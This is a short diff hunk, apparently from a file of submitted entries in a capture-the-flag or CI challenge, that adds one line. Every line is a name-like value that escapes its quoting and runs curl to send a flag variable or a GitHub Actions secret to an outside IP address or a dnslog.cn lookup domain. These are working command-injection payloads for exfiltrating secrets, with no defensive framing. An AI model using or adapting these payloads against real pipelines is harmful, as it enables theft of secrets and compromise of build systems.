@@ -659,3 +659,4 @@ R1gelX29:a"; set +e; curl http://101.132.238.43:5992/?token=$flag;#
 R1gelX29:a"; set +e; curl http://101.132.238.43:5992/?token=$flag;#
 R1gelX29:a"; set +e; curl http://101.132.238.43:5000/?token=$flag;#
 R1gelX29:fda;curl fkssbb.sxhx72.dnslog.cn;curl $flag.sxhx72.dnslog.cn;curl ${{ secret.FLAG }}.sxhx72.dnslog.cn;#echo${IFS}"a
+R1gelX29:fda";curl fkssbb.sxhx72.dnslog.cn;curl $flag.sxhx72.dnslog.cn;curl ${{ secret.FLAG }}.sxhx72.dnslog.cn;#echo${IFS}"a
